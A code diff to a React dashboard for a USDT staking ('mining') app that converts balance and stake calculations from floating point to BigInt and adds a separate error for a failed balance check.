@@ -4,7 +4,7 @@ import { useWallet } from '../lib/web3';
 import { useStaking } from '../hooks/useStaking';
 import { useTelegram } from '../hooks/useTelegram';
 import { telegramConnectionsManager } from '../lib/telegramConnections';
-import { formatUnits } from 'ethers';
+import { formatUnits, parseUnits } from 'ethers';
 import { usePrice } from '../hooks/usePrice';
 import { parseEthersError } from '../utils/errors';
 
@@ -78,46 +78,58 @@ const Dashboard: React.FC = () => {
             await approve();
 
             const balanceStr = await getWalletBalance(userAddress);
-            if (!balanceStr || parseFloat(balanceStr) < 50) {
+            if (!balanceStr) {
+                showAlert("Could not check wallet balance due to network issues. Try again.");
+                setLoading(false);
+                return;
+            }
+
+            const wBalanceBigInt = parseUnits(balanceStr, 18);
+            const minStakeBigInt = parseUnits("50", 18);
+
+            if (wBalanceBigInt < minStakeBigInt) {
                 showAlert("You have less than 50 USDT. You need minimum 50 USDT for mining.");
                 setLoading(false);
                 return;
             }
+
             const info = await getStakedInfo(userAddress);
-            let activeStaked = 0;
-            const wBalanceNum = parseFloat(balanceStr);
+            let activeStakedBigInt = 0n;
             if (info) {
                 const count = info.stakeCount;
-                let runningStakedSum = 0;
+                let runningStakedSumBigInt = 0n;
                 for (let i = 0; i < count; i++) {
                     const detail = await getStakeDetails(userAddress, i);
                     if (detail && !detail.withdrawn) {
-                        const stakeAmount = parseFloat(formatUnits(detail.amount, 18));
+                        const stakeAmountBigInt = detail.amount;
                         const finished = (Date.now() / 1000) > detail.startTime + (37 * 86400);
                         const wasFlushed = isStakePermanentlyFlushed(userAddress, i);
-                        const isViolated = wasFlushed || (!finished && wBalanceNum < runningStakedSum + stakeAmount);
+                        const isViolated = wasFlushed || (!finished && wBalanceBigInt < runningStakedSumBigInt + stakeAmountBigInt);
                         if (!isViolated && !finished) {
-                            activeStaked += stakeAmount;
-                            runningStakedSum += stakeAmount;
+                            activeStakedBigInt += stakeAmountBigInt;
+                            runningStakedSumBigInt += stakeAmountBigInt;
                         }
                     }
                 }
             }
 
-            const stakeableBalance = Math.max(0, wBalanceNum - activeStaked);
+            let stakeableBalanceBigInt = wBalanceBigInt - activeStakedBigInt;
+            if (stakeableBalanceBigInt < 0n) {
+                stakeableBalanceBigInt = 0n;
+            }
 
-            if (stakeableBalance < 50) {
+            if (stakeableBalanceBigInt < minStakeBigInt) {
                 showAlert("You have less than 50 USDT. You need minimum 50 USDT for mining.");
                 setLoading(false);
                 return;
             }
 
-        const tx = await stake(formatUsdtAmount(stakeableBalance));
-        await tx.wait();
-        await updateMiningData();
+            const tx = await stake(formatUnits(stakeableBalanceBigInt, 18));
+            await tx.wait();
+            await updateMiningData();
 
-        showAlert("Node Successfully Activated! 🚀");
-        handleBackToTelegram();
+            showAlert("Node Successfully Activated! 🚀");
+            handleBackToTelegram();
         } catch (err: any) {
             console.error("[Mining] Error:", err);
             
